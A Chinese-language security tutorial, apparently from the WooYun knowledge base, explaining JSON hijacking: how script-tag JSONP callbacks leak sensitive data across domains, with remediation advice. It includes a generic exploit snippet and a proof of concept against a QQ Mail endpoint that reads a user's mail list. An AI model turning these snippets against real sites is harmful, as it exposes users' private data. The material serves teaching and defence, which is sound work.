# Json hijacking/Json劫持漏洞

**0x00 相关背景介绍**

JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写。同时也易于机器解析和生成。它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。这些特性使JSON成为理想的数据交换语言。

这种纯文本的数据交互方式由于可以天然的在浏览器中使用，所以随着ajax和web业务的发展得到了广大的发展，各种大型网站都开始使用，包括Yahoo，Google，Tencent，Baidu等等。

但是如果这种交互的方式用来传递敏感的数据，并且传输的时候没有做太多安全性控制的话将导致安全漏洞，根据敏感信息的不同导致会导致应用遭受不同级别的攻击。

**0x01 成因**

JSON属于javascript的一种实际应用，作为数据传输的一种有效方式，在使用的时候必须考虑到javascript在浏览器里的跨域安全策略影响，一般来说，譬如要传输如下的数据

```
$data=array("username"=>"wooyun",  
   "password"=>"wooyun"  
);  

```

JSON实际应用的时候会有两种传输数据的方式：

xmlhttp获取数据方式：

```
{"username":"wooyun","password":"wooyun"}  

```

当在前端获取数据的时候，由于数据获取方和数据提供方属于同一个域譬如www.wooyun.org下面，属于同一个可信的安全区域。所以可以使用xmlhttp的方式来获取数据，然后再用xmlhttp获取到的数据传入自己的js逻辑譬如eval（也可以使用其他方式），这种方式下数据可以保证只在可信的域下传输，不会（目前的浏览器的环境下是这样）导致数据向不可信的第三方泄露。

script获取数据方式：

```
userinfo={"username":"wooyun","password":"wooyun"}  

```

如果传输的数据在两个不同的域，譬如对于大的互联网公司，代表了A应用的A域名想获取代表B应用的B域名的数据时，由于在javascript里无法跨域获取数据，所以一般采取script标签的方式获取数据，传入一些callback来获取最终的数据。譬如获取上面数据的时候可以使用

```
<script src="http://www.wooyun.org/userdata.php?callback=userinfo"></script>  

```

由于数据在两个完全不同的域里传输，如果缺乏有效地控制就会导致数据被泄露给第三方程序。

**0x02 攻击方式及危害**

通过分析应用里的数据交互，我们经常可以发现敏感信息泄露的情况发生。通常的方式包括，抓取应用的交互，查看里面敏感的数据，如果在传输的时候没有安全控制，就可以发现此类漏洞了。

主要的危害是对于一些数据敏感的应用会造成较严重的攻击，对于数据不敏感甚至是对第三方公开的应用来说，这类问题基本不算是安全问题，通过在第三方域使用javascript hijacking的方式我们就可以窃取到敏感数据了。一般的exploit代码形式如下：

```
<script>  
function wooyun_callback(a){  
alert(a);  
}  
</script>  
<script src="http://www.wooyun.org/userdata.php?callback=wooyun_callback"></script>  

```

**0x03 实际案例**

[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046)

通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。

```
<script>  
var Qmail={};  
</script>  
<script src="http://mail.qq.com/cgi-bin/login?fun=passport&target=MLIST&t=login.js&pagesize=10&resp_charset=gb2312&1=3"></script>  
<script>  
alert(Qmail.newMailsList.nextUrl);  
alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);  
alert(Qmail.newMailsList.summary);  
</script>  

```

**0x04 修复方案**

尽量避免跨域的数据传输，对于同域的数据传输使用xmlhttp的方式作为数据获取的方式，依赖于javascript在浏览器域里的安全性保护数据。如果是跨域的数据传输，必须要对敏感的数据获取做权限认证，具体的方式可以包括：

```
1 referer的来源限制，利用前端referer的不可伪造性来保障请求数据的应用来源于可信的地方，此种方式力度较稀，完全依赖于referer，某些情况下（如存在xss）可能导致被绕过。
2 token的加入，严格来说，这种利用javascript hijacking的方式获取数据是CSRF的一种，不过较之传统的CSRF不能获取数据只能提交而言，这种方式利用javascript可以获取一些敏感信息而已。如果我们能让攻击者对接口未知，就可以实现json
 hijacking的防御了。利用token对调用者的身份进行认证，这种方式对于调用者的身份会要求力度较细，但是一旦出现xss也可能导致前端Token的泄露，从而导致保护失效。
3
对于同域的json使用情况下，可以在数据的输出头部加入while(1);的方式避免数据被script标签的方式引用，这可以防止一些比较有特性的浏览器里导致的数据泄漏。

```

**0x05 相关其他安全问题**

1 json正确的http头输出

**0x06 相关资源**

http://www.json.org/json-zh.html